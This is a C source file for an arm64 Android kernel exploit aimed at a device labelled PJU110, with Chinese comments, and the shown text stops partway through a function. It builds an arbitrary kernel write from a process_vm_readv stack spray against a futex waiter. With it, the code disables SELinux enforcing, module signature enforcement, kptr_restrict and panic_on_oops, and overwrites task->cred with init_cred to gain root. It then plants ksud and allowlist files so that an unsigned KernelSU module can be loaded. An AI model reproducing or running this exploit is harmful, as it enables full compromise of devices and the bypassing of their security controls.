/*
 * gl_pju110.c — PJU110 栈喷射 exploit (process_vm_readv 版)
 * ===========================================================================
 * 喷射原语用 process_vm_readv 的 iovstack_r 落栈位置，与 futex waiter 相差
 * -0x40，因此 rvec 槽位可精确命中 waiter 的 tree_entry 字段。
 *
 * === PJU110 栈偏移 (vmlinux_2900.elf 反汇编, 精确到立即数) ===
 *
 * waiter 调用链:
 *   __arm64_sys_futex(0x70) → do_futex(0x60 callee + 0x1b0 local)
 *   do_futex: stp [sp,#-96]! ; mov x29,sp ; sub sp,#0x1b0
 *   waiter = x29 - 0xc8 = entry_sp - 0x198   (0x8328b0c: sub x0,x29,#0xc8)
 *
 * process_vm_readv 调用链 (喷射原语):
 *   __arm64_sys_process_vm_readv(0x10) → process_vm_rw(0x180)
 *   rvec → rw_copy_check_uvector → iovstack_r @ process_vm_rw::sp + 0x38
 *   iovstack_r[0] = entry_sp - 0x158
 *
 * DELTA(iovstack_r[0] - waiter) = -0x40
 *   → rvec[4].iov_base 命中 waiter+0x00 (tree_entry.__rb_parent_color)
 *   → rvec[5].iov_base 命中 waiter+0x10 (tree_entry.rb_left)
 *
 * 目标: selinux_state.enforcing = 0 (Permissive)
 *
 * 编译: aarch64-linux-gnu-gcc -static -O2 -o gl_pju110 gl_pju110.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <dirent.h>
#include <linux/futex.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <stdarg.h>

#ifndef __NR_process_vm_readv
#define __NR_process_vm_readv 270
#endif
#ifndef __NR_process_vm_writev
#define __NR_process_vm_writev 271
#endif
#ifndef __NR_sendmsg
#define __NR_sendmsg 211
#endif
#ifndef __NR_gettid
#define __NR_gettid 178
#endif
#ifndef __NR_sched_setscheduler
#define __NR_sched_setscheduler 119
#endif
#ifndef __NR_sched_setattr
#define __NR_sched_setattr 274
#endif
#ifndef SCHED_OTHER
#define SCHED_OTHER 0
#endif
#ifndef SCHED_OTHER_POLICY
#define SCHED_OTHER_POLICY 0
#endif
#ifndef SCHED_BATCH_POLICY
#define SCHED_BATCH_POLICY 3      /* SCHED_BATCH：fair_policy，无需 CAP_SYS_NICE */
#endif
/* sched_attr：内核 UAPI 结构（4.19 版 SCHED_ATTR_SIZE_VER0 = 48 字节） */
struct sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};
#ifndef __NR_sendmmsg
#define __NR_sendmmsg 269
#endif
#ifndef __NR_setresuid
#define __NR_setresuid 147
#endif
#ifndef __NR_setresgid
#define __NR_setresgid 149
#endif

/* ── 用户地址 (memfd-backed MAP_FIXED) ── */
#define T_ADDR  ((void*)0x10000000UL)
#define P_ADDR  ((void*)0x10001000UL)
#define R_ADDR  ((void*)0x10002000UL)
#define Q_ADDR  ((void*)0x10003000UL)

/* ── 静态链接地址（vmlinux_2900.elf nm 实测，KASLR slide 的基准）── */
#define LINK_TEXT       0xffffff8008080000UL    /* _text 链接地址 */
#define TEXT_OFFSET     0x00080000UL            /* _text - image_base */
#define SELINUX_STATE_S 0xffffff800b1b8bd8UL    /* selinux_state 静态链接地址 */
#define EMPTY_ZERO_S    0xffffff800ae4c000UL    /* empty_zero_page 静态链接地址 */
#define INIT_TASK_S     0xffffff800aaf25c0UL    /* init_task 静态链接地址 */

/* ★★★ v79i 新增：模块签名强制开关 ★★★
 *   nm -n 实测：sig_enforce = 0xffffff800ab0a9f0 （1 字节 bool）
 *   反汇编 is_module_sig_enforced（0xffffff800832f7a8）逐条印证：
 *     adrp x8, 0xffffff800ab0a000
 *     ldrb w0, [x8, #2544]      ; 2544 = 0x9F0 ⇒ 0xffffff800ab0a9f0 = sig_enforce
 *     ret
 *   源码 kernel/module.c:271：static bool sig_enforce = IS_ENABLED(CONFIG_MODULE_SIG_FORCE);
 *   本机 CONFIG_MODULE_SIG_FORCE=y ⇒ 初值 1，且
 *     module_param(sig_enforce, bool_enable_only, 0644)
 *   而 bool_enable_only 的实现（kernel/params.c:315-333）是：
 *     if (!new_value && orig_value) return -EROFS;   ← 一旦为 1，永远无法写回 0
 *   所以运行时 sysfs 改不动它（实测 `echo 0 >` 被拒）。只能靠任意写把这一字节清零。
 *
 *   清零后 kernel/module.c:2883 的逻辑就变了：
 *     if (err == -ENOKEY && !is_module_sig_enforced()) err = 0;
 *   ⇒ 未签名模块不再被拒，insmod 放行（KernelSU 越狱模式的前提）。
 *
 *   ⚠️ 这是 1 字节目标，写入值的 byte0 必须是 0x00：
 *      和 enforcing 的取值约束完全一致 ⇒ 复用同一套 value=bm_pmd+0x800。 */
#define SIG_ENFORCE_S   0xffffff800ab0a9f0UL
/* ★★★ v81 新增两个"调试解锁"目标（都在可写段，已用段边界核算）★★★
 *
 * 段边界（vmlinux_2900.elf nm -n 实测）：
 *   _text                   0xffffff8008080000
 *   __start_rodata          0xffffff8009620000
 *   __init_begin            0xffffff800a8d0000   ← mark_rodata_ro() 只读区到这儿
 *   _sdata                  0xffffff800aa50000   ← 可写区从这里开始
 *   __bss_start             0xffffff800ae4b800
 *   _end                    0xffffff800ba3b000
 *
 *   ⇒ 判据：target 必须 >= _sdata(0xffffff800aa50000)。
 *     落在 [_text, __init_begin) 的地址会被 mark_rodata_ro() 与
 *     mark_linear_text_alias_ro() 双双设成 PAGE_KERNEL_RO，
 *     往那儿写必然 Page Fault ⇒ panic_on_oops=1 时直接重启。
 *     这就是 security_hook_heads(0xffffff800a832e98) 不可写的铁证。
 *
 * --- 目标 A: kptr_restrict (int) ---
 *   /proc/sys/kernel/kptr_restrict 当前 = 2（/proc/kallsyms 对 shell 全零化）
 *   清零后：kallsyms 对普通进程明文 ⇒ 运行时符号地址不用再从 vmlinux 推。
 *   邻居核算：kptr_restrict @ …e428，下一个符号 ptr_key @ …e430。
 *             8 字节写覆盖 …e428..e42f，刚好不碰 ptr_key。✅
 *
 * --- 目标 B: panic_on_oops (int) ---
 *   当前 = 1，任何 oops 立即 panic 重启。清零后 oops 只杀当前进程，
 *   可以反复试错而不掉电。
 *   邻居核算：panic_on_oops @ …67e8，邻居 panic_timeout @ …67ec(4B)、
 *             panic_cpu @ …67f0(8B)。
 *             ⚠️ 8 字节写会把 panic_timeout 一起写成 0xFFFFFF80(-128)。
 *             影响评估：panic.c 里 `if (panic_timeout > 0)` 不成立
 *             ⇒ 走 emergency_restart()，与 panic_timeout=0 语义相同。
 *             而 panic_on_oops=0 时 oops 不再进 panic()，该分支根本不会被走到。
 *             ⇒ 副作用不可达，安全。✅ */
#define KPTR_RESTRICT_S 0xffffff800aa6e428UL
#define PANIC_ON_OOPS_S 0xffffff800aaf67e8UL
/* ★ v81 关键：int 型目标专用的 value
 *   kptr_restrict / panic_on_oops 是 4 字节 int，而原语是 str x10,[x8]（8 字节），
 *   目标 int 读到的就是 value 的低 32 位。若沿用 bm_pmd+0x800，低 32 位是
 *   0x0AE4D800 ⇒ kallsyms_show_value() 走 default: return false（kallsyms 仍被
 *   打码）、panic_on_oops 仍非 0（oops 仍 panic 重启），等于完全白写。
 *   必须选一个【低 32 位为 0】且 value&~3 仍指向可读写内核页的值。
 *   PAGE_OFFSET(0xffffffc000000000) 是唯一同时满足两者的地址：
 *     · 低 32 位 = 0  ⇒ 目标 int 真正被写成 0
 *     · value&~3 = 自身 ≠ 0 ⇒ 走 0x7fd4/0x7fe0/ret 安全分支（不碰 rb_root）
 *     · 线性映射首页 = phys memstart_addr(0x40000000) 起，即 Image 头部之后
 *       的保留零区：+16 读为 0，+8 可写且落在 header 保留区，
 *       一次性无副作用覆盖，可重复运行（+16 始终为 0，故 cmp 永不等）
 *   ⚠️ 线性别名只对 [__pa(_text), __pa(__init_begin)) 设 RO，
 *      phys 0x40000008 < __pa(_text)=0x40080000，仍可写，不会被 text-alias RO 拦截。
 *   byte 型目标（sig_enforce / selinux enforcing）继续用 bm_pmd+0x800（已实测）。 */
#define VALUE_INT_ZERO  0xffffffc000000000UL

/* ★ v77i：scratch 载体 = bm_pmd （0xffffff800ae4d000，4KB，.bss 全零页）
 *   nm -n 实测：empty_zero_page 0xffffff800ae4c000
 *               bm_pmd          0xffffff800ae4d000   （pmd_t[512]）
 *               bm_pte          0xffffff800ae4e000   （pte_t[512]）
 *
 *   为什么是 bm_pmd：它只在 early_fixmap_init()（start_kernel 极早期）
 *   里被 vmlinux 的 __pud_populate 当成 fixmap 的 PMD 表安装；
 *   此后 fixmap 只读 bm_pmd[0] 这一项（FIXADDR 整体 < 2MB，全部落在
 *   同一个 PMD 项内，源码里那条 BUILD_BUG_ON 就是保证这一点）。
 *   于是 bm_pmd[1..511]（即 +0x08 起的 0xFF8 字节）是"零且永不访问"的
 *   完美伪造对象载体。
 *   ⚠️ 偏移必须 >= 0x08，绝不能碰 bm_pmd[0]。
 *   ⚠️ 更不能用 empty_zero_page：它是所有匿名映射的"零页"源页，
 *      写它等于污染整机用户态内存。 */
#define BSS_SCRATCH_S   0xffffff800ae4d000UL

/* BSS_SCRATCH 内布局（互不重叠，全部 >= +0x08，全部在 .bss 零页内）：
 *   +0x040  fake_lock #1（+0x00 wait_lock / +0x08 waiters.rb_root /
 *                         +0x10 waiters.rb_leftmost / +0x18 owner）
 *   +0x0C0  fake_lock #2 —— 必须与 #1 不同地址：第 1 轮
 *           rb_insert_color_cached(leftmost=true) 会把 *(lock+0x10)
 *           写成 &waiter->tree_entry，第 2 轮 rb_erase 的 0x7f58 检查
 *           一旦读到 *(lock+0x10) == node 就会跳 0x7fb0 歧路。
 *   +0x800  value（= value & ~3 的落点）：rb_erase 的 0x7fd4 会读
 *           *(value+0x10)（须可读、得 0），0x7fe0 会写 *(value+0x08)（须可写）。
 *           低字节必须是 0x00 —— value 的 byte0 会落进 enforcing。 */
#define SCR_LOCK1       0x040UL
#define SCR_LOCK2       0x0C0UL
#define SCR_LOCK3       0x100UL
/* ★ v81：为 4 个目标各准备一个"本开机从未写过"的全新零槽。
 *   0x040(selinux 旧轮) / 0x0C0(误跑) / 0x100(sig 旧轮) 都已写脏，绝不可复用。
 *   约束（逐个核算过）：
 *     ① slot >= 0x08          —— 不能碰 bm_pmd[0]（fixmap 的 PMD 项）
 *     ② slot+0x84C < 0x1000   —— 假 task_struct 的 pi_lock 不能跨页
 *     ③ slot 区与 value 区(0x800..0x81F) 不重叠
 *     ④ 各 slot 的 +0x84C 互不相同、且不落进别的 slot 主区
 *   核算：0x140+0x84C=0x98C / 0x240+0x84C=0xA8C / 0x340+0x84C=0xB8C /
 *         0x440+0x84C=0xC8C  —— 全部 < 0x1000，且都不在 0x800..0x81F。 */
#define SCR_LOCK4       0x140UL   /* kptr_restrict  */
#define SCR_LOCK5       0x240UL   /* panic_on_oops  */
#define SCR_LOCK6       0x340UL   /* sig_enforce    */
#define SCR_LOCK7       0x440UL   /* selinux        */
/* ★ v82：leak / cred 模式专用全新槽。
 *   0x540 + 0x84C = 0xD8C < 0x1000 ✅ 且不在 0x800..0x81F ✅ */
#define SCR_LOCK8       0x540UL
/* ★ v82b：0x540 已被 diag 分支实测用过（写脏），cred 必须换新槽。
 *   rb_insert_color_cached(leftmost=true) 会把 fake_lock+0x10 写成
 *   【那个进程的 waiter 内核栈地址】。进程死后该栈已释放，
 *   下一次复用同一槽时 rt_mutex_adjust_prio_chain+0x154 的
 *   `ldr x8,[x8,#56]` 就会解引用野指针 → Oops → panic_on_oops=1 重启。
 *   实测证据：v82 cred 崩在 pc=rt_mutex_adjust_prio_chain+0x154，
 *   x22=fake_lock(bm_pmd+0x540)、x8=0xffffff80158ebc88（无本次 slide，
 *   属上一进程的栈）⇒ 铁证。
 *   约束核算：0x640 + 0x84C = 0xE8C < 0x1000 ✅（假 task 的 pi_lock 不跨页）
 *             0x640 不在 0x800..0x81F（value 区）✅
 *             与其他槽的 +0x20(state)/+0x84C(pi_lock) 互不重叠 ✅ */
#define SCR_LOCK9       0x640UL
/* 备用槽（若 0x640 也被用过）：0x740 + 0x84C = 0xF8C < 0x1000 ✅ */
#define SCR_LOCK10      0x740UL
/* ══════════════════════════════════════════════════════════════════════════
 * ★★★ 槽位台账（一台机器、一次开机内，每个槽只能用一次）★★★
 *
 * 为什么一次性：rb_insert_color_cached(leftmost=true) 会把 fake_lock+0x10
 *   写成【那个进程的 rt_waiter 内核栈地址】。进程死后该 vmap 栈被释放，
 *   下一个进程复用同槽时 rt_mutex_adjust_prio_chain+0x154 的
 *   `ldr x8,[x8,#56]` 解引用野指针 ⇒ Oops ⇒ panic_on_oops=1 ⇒ 重启。
 *
 * 约束（每个槽都逐个核算）：
 *   ① slot >= 0x08          —— 不能碰 bm_pmd[0]（fixmap 的 PMD 项）
 *   ② slot+0x84C < 0x1000   —— 假 task_struct 的 pi_lock 不跨页
 *   ③ slot 不在 0x800..0x81F（value 区）
 *
 * 实测使用记录：
 *   0x040 / 0x0C0 / 0x100 / 0x340 / 0x440  ← v81 各目标，脏
 *   0x540 ← v82 diag（成功写入 sig_enforce），脏
 *   0x640 ← v82b cred（成功，uid=0），脏
 *   0x780 ← v82c cred（成功），脏
 *   0x700 ← v82d cred（成功），脏
 *   0x6C0 ← v82e cred（成功，并触发 capget/sethostname 证明），脏
 *   ⚠️ 2026-10-27 08:15 重启后，以上全部归零，可重新使用。
 *      但 0x680 是本轮（重启后）首次使用的槽。
 * ══════════════════════════════════════════════════════════════════════════ */
/* 重启后新增的可用槽（互不重叠，约束全部满足） */
#define SCR_LOCK11      0x780UL   /* 0x780+0x84C=0xFCC < 0x1000 ✅ */
#define SCR_LOCK12      0x700UL   /* 0x700+0x84C=0xF4C < 0x1000 ✅ */
#define SCR_LOCK13      0x6C0UL   /* 0x6C0+0x84C=0xF0C < 0x1000 ✅ */
#define SCR_LOCK14      0x680UL   /* 0x680+0x84C=0xECC < 0x1000 ✅ ← v82f 本轮 */
#define SCR_VALUE       0x800UL

/* ══════════════════════════════════════════════════════════════════════════
 * ★★★ v82：新路线 —— task_struct->cred 指针改写为 &init_cred ★★★
 *
 * 为什么换路线（不再写 selinux enforcing / sig_enforce 这类"写 0 到某字节"）：
 *   旧路线只能把某个字节清零，能拿到的权限上限是"关掉一个开关"；
 *   而 cred 指针改写是【直接变成 root】—— uid/euid/fsuid 全 0、
 *   cap_permitted/cap_effective = 0x3fffffffff（38 个 capability 全开）。
 *
 * 为什么这条路在 PJU110 上成立（SW_TTBR0_PAN 不构成障碍）：
 *   原语 str x10,[x8] 写入的 value 必须是内核地址（用户地址会因
 *   CONFIG_ARM64_SW_TTBR0_PAN 在原子上下文缺页 ⇒ panic_on_oops=1 重启）。
 *   cred 指针要写的值恰好就是内核地址 &init_cred ⇒ 天然满足值域。
 *   而 rb_erase 的二次访问 *(value+0x10) / *(value+0x08) 也都落在
 *   init_cred 所在的可写 .data 段内，全程不碰用户页表。
 *
 * 数值（vmlinux_2900.elf 实测，均已逐项校验）：
 *   init_cred            = 0xffffff800aafcf78  （nm 实测，.data 段，可写）
 *   task_struct->real_cred 偏移 = 1888 = 0x760
 *   task_struct->cred      偏移 = 1896 = 0x768
 *   value = init_cred + slide = 0xffffffa86d0fcf78 （slide=0x2862600000 时）
 *     校验：init_cred 低 3 位 = 0x78 & 7 = 0 ⇒ value 4 字节对齐。
 *     关键判据是 rb_erase_cached 的 `ands x9,x10,#~3` + `b.eq`：
 *       仅当 value & ~3 == 0 时才跳到 +0x288 执行 `str x8,[x1]`
 *       （那条会污染 fake_lock->waiters.rb_root，埋下遍历崩溃的雷）。
 *     而 value & ~3 = value = 0xffffffa86d0fcf78 ≠ 0
 *       ⇒ b.eq 不成立 ⇒ 走 +0x7fd4(ldr [x9,#16]) / +0x7fe0(str [x9,#8]) / ret
 *       这条分支只多写一次 *(value+8)，落在 init_cred+8（.data 内，可写），
 *       不碰 rb_root，无后续解引用 ⇒ 安全。
 *   target = task + 0x768（8 字节对齐）
 *
 * init_cred 内容（直接 dump 过）：usage=4、uid..fsgid 全 0、
 *   cap_permitted = cap_effective = cap_bset = 0x3fffffffff。
 *   写它不需要走 commit_creds，因此不受 `if (new->usage <= 0) BUG()` 约束。
 * ══════════════════════════════════════════════════════════════════════════ */
#define LINK_INIT_CRED  0xffffff800aafcf78UL   /* init_cred 静态链接地址 */
#define LINK_COMMIT_CREDS 0xffffff80082968fcUL /* commit_creds 静态链接地址 */
#define TASK_REAL_CRED  0x760UL                /* task_struct->real_cred */
#define TASK_CRED       0x768UL                /* task_struct->cred */
/* commit_creds 里 x20 成为 task_struct* 的起点：
 *   +0x00 stp x29,x30,[sp,#-48]!
 *   +0x04 str x21,[sp,#16]
 *   +0x08 stp x20,x19,[sp,#32]
 *   +0x0c mrs x20, sp_el0        ← 这一条之后 x20 = current
 *   +0x10 ldr x19,[x20,#1888]    ← real_cred
 *   ⇒ 采样 IP 必须 >= +0x10 才能保证 x20 已是 task_struct。
 *   窗口上界 +0x100 足够覆盖 cmp/b.ne 与 usage 检查，且不越出函数。 */
#define CC_WIN_LO       0x010UL
#define CC_WIN_HI       0x100UL

/* 运行模式 */
#define MODE_LEGACY 0   /* 原有 selinux/sig 等"写 0 到某字节" */
#define MODE_LEAK   1   /* 纯泄漏验证：只拿 task_struct，绝不写内核 */
#define MODE_CRED   2   /* 泄漏 + 写 task->cred = &init_cred（第二步） */
#define MODE_DIAG   3   /* 原语诊断：只写 sig_enforce，验证 do_stamp 链路本身 */
static int g_mode = MODE_LEGACY;
static int g_do_clean = 0;   /* clean 模式：只清旧状态，不 insmod */
static char *g_run_cmd = 0;   /* ★ v85：一次性执行的命令（cred 成功后 exec） */

/* ══════════════════════════════════════════════════════════════════════
 * ★★★ v88：不依赖 exec —— 在 root 子进程里直接完成全部工作 ★★★
 *   1) kptr_restrict=0
 *   2) 解析 /proc/kallsyms 取 5 个未导出符号的真实地址
 *   3) 直接改内存里的 .ko 副本（st_shndx=SHN_ABS, st_value=真实地址）
 *   4) syscall(init_module) 加载
 *   5) prctl(0xDEADBEEF, CMD_REPORT_EVENT, EVENT_POST_FS_DATA) 触发 allowlist
 *   整个过程写 /data/local/tmp/ksu_work.log，不 fork、不 exec。
 * ══════════════════════════════════════════════════════════════════════ */
struct ksym_patch {
    const char *name;
    long off;              /* .ko 文件内 st_value 的偏移 */
    unsigned long stat;    /* vmlinux_2900.elf 里的静态链接地址 */
};

static unsigned long g_slide;   /* 前置声明（真正的定义在下方） */

static unsigned long ksym_lookup(const char *name)
{
    int fd = open("/proc/kallsyms", O_RDONLY);
    unsigned long found = 0;
    size_t nlen = strlen(name);
    char *buf;
    ssize_t len;
    size_t cap;

    if (fd < 0)
        return 0;
    cap = 4 * 1024 * 1024;
    buf = (char *)malloc(cap);
    if (!buf) {
        close(fd);
        return 0;
    }
    len = read(fd, buf, cap - 1);
    close(fd);
    if (len <= 0) {
        free(buf);
        return 0;
    }
    buf[len] = 0;
    {
        char *s = buf, *e = buf + len;
        while (s < e) {
            char *nl = (char *)memchr(s, '\n', e - s);
            unsigned long a;
            char *p;
            if (!nl)
                break;
            a = strtoul(s, 0, 16);
            p = s;
            while (p < nl && *p != ' ')
                p++;
            while (p < nl && *p == ' ')
                p++;
            p++;                        /* type 字符 */
            while (p < nl && *p == ' ')
                p++;
            if ((size_t)(nl - p) == nlen && !memcmp(p, name, nlen)) {
                found = a;
                break;
            }
            s = nl + 1;
        }
    }
    free(buf);
    return found;
}

/* 按 cmdline 精确匹配杀进程（不 fork，避免在损坏的 PI 链上死锁） */
static int ksu_kill_proc(const char *want)
{
    DIR *d;
    struct dirent *e;
    int pid = -1;

    d = opendir("/proc");
    if (!d)
        return -1;
    while ((e = readdir(d)) != NULL) {
        char cb[64];
        char p[64];
        int fd, n;

        if (e->d_name[0] < '0' || e->d_name[0] > '9')
            continue;
        snprintf(p, sizeof(p), "/proc/%s/cmdline", e->d_name);
        fd = open(p, O_RDONLY);
        if (fd < 0)
            continue;
        n = (int)read(fd, cb, sizeof(cb) - 1);
        close(fd);
        if (n <= 0)
            continue;
        cb[n] = 0;
        if (strcmp(cb, want) == 0) {
            pid = atoi(e->d_name);
            break;
        }
    }
    closedir(d);
    if (pid > 0)
        kill(pid, SIGKILL);
    return pid;
}

/* 以 root 身份读 /dev/kmsg，把最近的内核日志落到我们的日志文件里 */
static void dump_dmesg_grep(int lf)
{
    static char big[2 << 20];
    long n;
    char *p, *nl;
    int hits = 0;
    errno = 0;
    n = syscall(116 /* __NR_syslog */, 3 /* READ_ALL */, big, sizeof(big) - 1);
    if (n <= 0) {
        dprintf(lf, "syslog(READ_ALL) ret=%ld errno=%d\n", n, errno);
        return;
    }
    big[n] = 0;
    dprintf(lf, "dmesg bytes=%ld\n", n);
    p = big;
    while (p && *p) {
        nl = strchr(p, '\n');
        if (nl)
            *nl = 0;
        if (strstr(p, "KernelSU") || strstr(p, "ksu") ||
            strstr(p, "sucompat") || strstr(p, "ksud") ||
            strstr(p, "execute su")) {
            dprintf(lf, "D| %s\n", p);
            if (++hits > 300)
                break;
        }
        if (!nl)
            break;
        p = nl + 1;
    }
    dprintf(lf, "dmesg hits=%d\n", hits);
}
static void dump_kmsg_filter(int lf)
{
    int f = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
    char buf[512];
    int got = 0, hits = 0;
    if (f < 0) {
        dprintf(lf, "kmsg open errno=%d\n", errno);
        return;
    }
    while (got < 4000) {
        ssize_t r = read(f, buf, sizeof(buf) - 1);
        if (r <= 0)
            break;
        buf[r] = 0;
        got++;
        if (strstr(buf, "KernelSU") || strstr(buf, "ksu") ||
            strstr(buf, "sucompat") || strstr(buf, "ksud") ||
            strstr(buf, "execute su")) {
            dprintf(lf, "K| %s", buf);
            if (++hits > 250)
                break;
        }
    }
    dprintf(lf, "kmsg scan: read=%d hits=%d\n", got, hits);
    close(f);
}
static void dump_kmsg(int lf, int n)
{
    int f;
    char buf[512];
    int got = 0;

    f = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
    if (f < 0) {
        dprintf(lf, "kmsg open errno=%d\n", errno);
        return;
    }
    while (got < n) {
        ssize_t r = read(f, buf, sizeof(buf) - 1);
        if (r <= 0)
            break;
        buf[r] = 0;
        dprintf(lf, "K| %s", buf);
        got++;
    }
    close(f);
}

static void ksu_do_work(void)
{
    static const struct ksym_patch P[] = {
        { "kallsyms_lookup_name",  2894176, 0xffffff800833745cUL },
        { "ext4_unregister_sysfs", 2896432, 0xffffff800859d4d0UL },
        { "security_hook_heads",   2896528, 0xffffff800a832e98UL },
        { "init_nsproxy",          2896552, 0xffffff800aafce00UL },
        { "selinux_state",         2897440, 0xffffff800b1b8bd8UL },
        { "aarch64_insn_patch_text_nosync", 2894128,
          0xffffff80095e9e20UL },
    };
    int lf;
    int i;
    int src;
    struct stat st;
    char *ko;
    ssize_t rd;
    long rc;

    lf = open("/data/local/tmp/ksu_work.log",
              O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (lf < 0)
        lf = 2;
    dprintf(lf, "===== ksu_do_work: uid=%d euid=%d =====\n",
            (int)getuid(), (int)geteuid());

    if (g_do_clean) {
        /* 清掉老模块（prctl 协议）遗留的状态：
         *  - /data/adb/ksud         我们放的假脚本，会让 Manager 误判"已安装"
         *  - /data/adb/ksu/.allowlist 旧格式文件，3.3.1 解析器读它会失败，
         *                             表现就是"超级用户"页面一直刷新
         * 清完后重开 Manager，它会自己写入真正的 ksud 并重建 allowlist。
         */
        int r1 = unlink("/data/adb/ksud");
        int r2 = unlink("/data/adb/ksu/.allowlist");
        int r3 = unlink("/data/adb/ksu/.allowlist.tmp");
        int r4 = unlink("/data/adb/ksu/.allowlist.backup");
        dprintf(lf, "clean: ksud=%d allowlist=%d tmp=%d bak=%d\n",
                r1, r2, r3, r4);
        dprintf(lf, "clean: errno=%d\n", errno);
        mkdir("/data/adb/ksu", 0777);
        chmod("/data/adb/ksu", 0777);
        dprintf(lf, "===== clean done =====\n");
        fsync(lf);
        if (lf != 2)
            close(lf);
        return;
    }

    {
        int f = open("/proc/sys/kernel/kptr_restrict", O_WRONLY);
        if (f >= 0) {
            ssize_t w = write(f, "0\n", 2);
            dprintf(lf, "kptr write ret=%ld errno=%d\n", (long)w, errno);
            close(f);
        } else {
            dprintf(lf, "kptr open failed errno=%d\n", errno);
        }
        f = open("/proc/sys/kernel/kptr_restrict", O_RDONLY);
        if (f >= 0) {
            char b[8] = { 0 };
            if (read(f, b, 4) > 0)
                dprintf(lf, "kptr now=%s", b);
            close(f);
        }
    }

    /* ★★★ v104：把 Manager 自带的 libksud.so 安装成 /data/adb/ksud ★★★
     *
     * KernelSU 3.3.1 的 sucompat 不再把 su 重定向到 /system/bin/sh，而是：
     *     ksud_file = filp_open("/data/adb/ksud", O_PATH, 0);
     *     if (IS_ERR(ksud_file)) goto do_orig_execve;   ← 没有就直接失败
     *     ... execveat(fd, "", argv, envp, AT_EMPTY_PATH)
     * 也就是说 **su 实际执行的就是 /data/adb/ksud**。
     * 没有它 → Manager 的 libsu RootService 起不来 →
     * 「超级用户」页面永远停在 Refreshing。
     *
     * lib/arm64-v8a/libksud.so 是 Rust 写的可执行 PIE
     * (Entry 0x327B08, interpreter /system/bin/linker64)，直接当二进制用。
     */
    {
        int in = open("/sdcard/Download/libksud.so", O_RDONLY);
        dprintf(lf, "putksud: src open=%d errno=%d\n", in, errno);
        if (in >= 0) {
            int out = open("/data/adb/ksud",
                           O_WRONLY | O_CREAT | O_TRUNC, 0755);
            dprintf(lf, "putksud: dst open=%d errno=%d\n", out, errno);
            if (out >= 0) {
                static char b[65536];
                ssize_t n;
                long total = 0;
                while ((n = read(in, b, sizeof(b))) > 0) {
                    ssize_t off = 0;
                    while (off < n) {
                        ssize_t w = write(out, b + off, (size_t)(n - off));
                        if (w <= 0)
                            break;
                        off += w;
                        total += w;
                    }
                }
                close(out);
                chmod("/data/adb/ksud", 0755);
                chown("/data/adb/ksud", 0, 0);
                dprintf(lf, "putksud: wrote %ld bytes errno=%d\n", total, errno);
            }
            close(in);
        }
        mkdir("/data/adb/ksu/bin", 0777);
        mkdir("/data/adb/ksu/lib", 0777);
    }
    /* ★ v106：把内核日志里和 KSU/su 相关的行抓出来，用于确认
     * sucompat 到底有没有被调用到。 */
    dump_dmesg_grep(lf);
    dump_kmsg_filter(lf);
    /* ★★★ v101：insmod 之前先清掉旧模块（prctl 协议）遗留的状态 ★★★
     *  - /data/adb/ksud            我们早期放的假脚本，Manager 会误判"已安装"
     *                              而一直卡在"正在刷新"
     *  - /data/adb/ksu/.allowlist  旧格式文件，3.3.1 的解析器读它会失败
     * 清完后本次 insmod 起来的 3.3.1 模块会重建干净状态。
     * 这样"清理 + 加载"共用一次 root，不额外消耗 slot。 */
    {
        struct stat s1, s2;
        int r1 = -2; /* ★ v105：不再删除 /data/adb/ksud —— 它现在是真的 ksud，
                      * 删掉 su 就没法工作了（sucompat 必须 filp_open 到它）。 */
        int e1 = 0;
        int r2 = unlink("/data/adb/ksu/.allowlist");
        int e2 = errno;
        int r3 = unlink("/data/adb/ksu/.allowlist.tmp");
        int r4 = unlink("/data/adb/ksu/.allowlist.backup");
        dprintf(lf, "preclean: ksud=%d/%d allow=%d/%d tmp=%d bak=%d\n",
                r1, e1, r2, e2, r3, r4);
        if (stat("/data/adb/ksud", &s1) == 0)
            dprintf(lf, "preclean: ksud still exists size=%ld\n", (long)s1.st_size);
        if (stat("/data/adb/ksu/.allowlist", &s2) == 0)
            dprintf(lf, "preclean: allowlist still exists size=%ld\n", (long)s2.st_size);
        {
            DIR *d = opendir("/data/adb/ksu");
            struct dirent *de;
            dprintf(lf, "preclean: /data/adb/ksu = [");
            if (d) {
                while ((de = readdir(d))) {
                    if (de->d_name[0] == '.')
                        continue;
                    dprintf(lf, " %s", de->d_name);
                }
                closedir(d);
            } else {
                dprintf(lf, " opendir fail errno=%d", errno);
            }
            dprintf(lf, " ]\n");
        }
    }
    /* ★★★ v108：安装 allowlist，把 Manager 的 uid 授予 root ★★★
     *
     * 为什么必须这么做：
     *   su 的放行条件是 ksu_is_uid_granted_root(uid) → allowlist；
     *   而给某个 app 授权的 ioctl (KSU_IOCTL_SET_APP_PROFILE) 的权限是
     *   only_manager，manager 身份又只能由 track_throne() 扫描 /data/app
     *   校验签名来设置 —— 不是 manager 就无权授权，形成死锁。
     *
     * 但模块 init 会调用 ksu_load_allow_list() 读
     *   KERNEL_SU_ALLOWLIST = "/data/adb/ksu/.allowlist"
     * 所以我们直接放一个合法 v4 格式的文件，init 时就自动加载，
     * Manager 立刻获得 su 权限 → libsu RootService 能起来 →
     * 「超级用户」页面不再无限刷新。
     * 文件内容：magic 0x7f4b5355 + version 4 + 一条 app_profile
     *           (key=me.weishu.kernelsu, curr_uid=10266, allow_su=1)
     */
    {
        int in = open("/sdcard/Download/allowlist.bin", O_RDONLY);
        dprintf(lf, "putal: src open=%d errno=%d\n", in, errno);
        if (in >= 0) {
            int out = open("/data/adb/ksu/.allowlist",
                           O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (out >= 0) {
                static char ab[4096];
                ssize_t n;
                long total = 0;
                while ((n = read(in, ab, sizeof(ab))) > 0) {
                    ssize_t off = 0;
                    while (off < n) {
                        ssize_t w = write(out, ab + off, (size_t)(n - off));
                        if (w <= 0)
                            break;
                        off += w;
                        total += w;
                    }
                }
                close(out);
